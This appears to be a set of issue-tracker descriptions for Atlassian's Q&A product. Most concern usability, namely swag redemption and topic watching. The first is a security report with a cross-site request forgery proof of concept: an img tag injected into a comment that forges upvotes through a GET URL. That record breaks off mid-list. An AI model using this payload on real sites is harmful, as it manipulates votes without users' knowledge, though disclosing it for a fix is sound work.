To maintain the integrity in the way points are awarded for questions in CQ, some sort of CSRF token can be generated for all upvotes and downvote requests.\r\n\r\nPoC:\r\n\r\n1. Obtain the ID of the question/answer which you wish to upvote. Hovering over the date listed on the question will reveal the ID of the question/answer e.g. *524305*\r\n2. Construct a link which upvotes a given ID on GET request: e.g.\r\n{{https://cquestionspentest.atlassian.net/wiki/cq/upvote.action?answerId=524305&src=email}}\r\n3. Post a comment, but intercept the request, replacing the body parameter with the following:\r\n{noformat}\r\n<p><img class=\"confluence-embedded-image\" title=\"null > blah.jpg\" src=\"https://cquestionspentest.atlassian.net/wiki/cq/upvote.action?answerId=524305&src=email\" data-image-src=/wiki/cq/upvote.action?answerId=524305&src=email?version=1&amp;modificationDate=1403481880299&amp;api=v2\" data-linked-resource-id=\"884750\" data-linked-resource-type=\"attachment\" data-linked-resource-default-alias=\"/wiki/cq/upvote.action?answerId=524305&src=email\" data-base-url=\"https://cquestionspentest.atlassian.net/wiki/cq/upvote.action?answerId=524305&src=email\"></p>\r\n{noformat}\r\n4.

The UI to redeem these items can be accessed from the user's own profile page in Confluence.  However, there's a few issues with this:\r\n\r\n1) The URL is https://answers.atlassian.com/plugins/swag/myswag.action - not very memorable. We should consider aliasing it to something like \"answers.atlassian.com/swag\", like it was on the old system.\r\n\r\n2) The Confluence user profile is buried pretty deep in Atlassian Answers due to the fact we're operating Confluence Questions in \"standalone\" mode.  It takes 2-3 clicks to find the swag UI from the Answers homepage.\r\n\r\n3) Users aren't notified when they are eligible to claim new items of swag.  We need to rely on the user checking back regularly to know when they've earned something.\r\n",

Unfortunately you cannot search for them since the watch link is not displayed. Manually scan the unordered list to find those topics and see if they display the unwatched link.\r\n* https://answers.atlassian.com/questions/topics\r\n\r\nAlso, topics that you are watching have a small Eye icon beside it when displayed under a Question.",
